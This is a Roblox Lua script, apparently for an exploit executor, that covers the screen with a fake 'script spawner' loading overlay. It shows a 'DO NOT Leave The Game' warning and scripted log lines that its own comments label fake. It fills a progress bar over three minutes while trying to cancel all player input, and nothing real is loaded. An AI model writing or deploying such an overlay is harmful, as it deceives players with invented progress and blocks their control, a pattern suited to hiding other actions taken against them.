--// Fullscreen Loading Screen (Delta)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

-- Background
local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(20,0,40)

-- Fake stars
for i=1,100 do
    local star = Instance.new("Frame", bg)
    star.Size = UDim2.new(0,2,0,2)
    star.Position = UDim2.new(math.random(),0,math.random(),0)
    star.BackgroundColor3 = Color3.fromRGB(180,0,255)
    star.BorderSizePixel = 0
    task.spawn(function()
        while gui.Parent do
            local tw = TweenService:Create(star, TweenInfo.new(math.random(2,5)), {BackgroundTransparency = math.random()})
            tw:Play()
            tw.Completed:Wait()
        end
    end)
end

-- Top warning
local warnText = Instance.new("TextLabel", bg)
warnText.Size = UDim2.new(1,0,0,50)
warnText.Position = UDim2.new(0,0,0,10)
warnText.Text = "⚠️ DO NOT Leave The Game – We Are Loading Your Script ⚠️"
warnText.TextColor3 = Color3.fromRGB(255,100,255)
warnText.Font = Enum.Font.SourceSansBold
warnText.TextSize = 24
warnText.BackgroundTransparency = 1

-- Log output area
local logFrame = Instance.new("Frame", bg)
logFrame.Size = UDim2.new(0.9,0,0.65,0)
logFrame.Position = UDim2.new(0.05,0,0.15,0)
logFrame.BackgroundTransparency = 1
local UIListLayout = Instance.new("UIListLayout", logFrame)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Progress bar background
local progressBg = Instance.new("Frame", bg)
progressBg.Size = UDim2.new(0.9,0,0,25)
progressBg.Position = UDim2.new(0.05,0,0.83,0)
progressBg.BackgroundColor3 = Color3.fromRGB(60,0,100)
progressBg.BorderSizePixel = 0
progressBg.BackgroundTransparency = 0.2
progressBg.ZIndex = 10

-- Progress fill
local progressFill = Instance.new("Frame", progressBg)
progressFill.Size = UDim2.new(0,0,1,0)
progressFill.BackgroundColor3 = Color3.fromRGB(200,0,255)
progressFill.BorderSizePixel = 0
progressFill.ZIndex = 11

-- Progress text
local progressText = Instance.new("TextLabel", progressBg)
progressText.Size = UDim2.new(1,0,1,0)
progressText.BackgroundTransparency = 1
progressText.TextColor3 = Color3.fromRGB(255,200,255)
progressText.Font = Enum.Font.Code
progressText.TextSize = 18
progressText.ZIndex = 12

-- Function to add log line
local function addLog(text)
    local label = Instance.new("TextLabel", logFrame)
    label.Size = UDim2.new(1,0,0,20)
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Text = text
    label.TextColor3 = Color3.fromRGB(200,150,255)
    label.Font = Enum.Font.Code
    label.TextSize = 18
    label.BackgroundTransparency = 1
end

-- Block all input
UserInputService.InputBegan:Connect(function(input)
    if gui.Parent then
        input.UserInputState = Enum.UserInputState.Cancel
    end
end)

-- Fake loading logs
local logs = {
    "[INIT] Starting script spawner...",
    "[LOADER] Allocating memory blocks...",
    "[CHECK] Validating game assets...",
    "[OK] Resources verified.",
    "[SPAWN] Initializing module 1/5...",
    "[SPAWN] Initializing module 2/5...",
    "[SPAWN] Initializing module 3/5...",
    "[SPAWN] Initializing module 4/5...",
    "[SPAWN] Initializing module 5/5...",
    "[FINALIZE] Cleaning up temp cache...",
    "[DONE] Script loaded successfully."
}

-- Run for 3 minutes (180 seconds)
task.spawn(function()
    local totalTime = 180 -- 3 minutes
    local interval = 3 -- one log every 3 seconds
    local steps = totalTime / interval -- 60 logs
    
    for i = 1, steps do
        local text = logs[i] or ("[SPAWNER] Task "..i.." completed...")
        addLog(text)

        -- update progress bar with tween
        local pct = math.floor((i/steps)*100)
        TweenService:Create(
            progressFill,
            TweenInfo.new(interval, Enum.EasingStyle.Linear),
            {Size = UDim2.new(i/steps,0,1,0)}
        ):Play()
        progressText.Text = pct.."%"
        
        task.wait(interval)
    end
    
    gui:Destroy()
end)
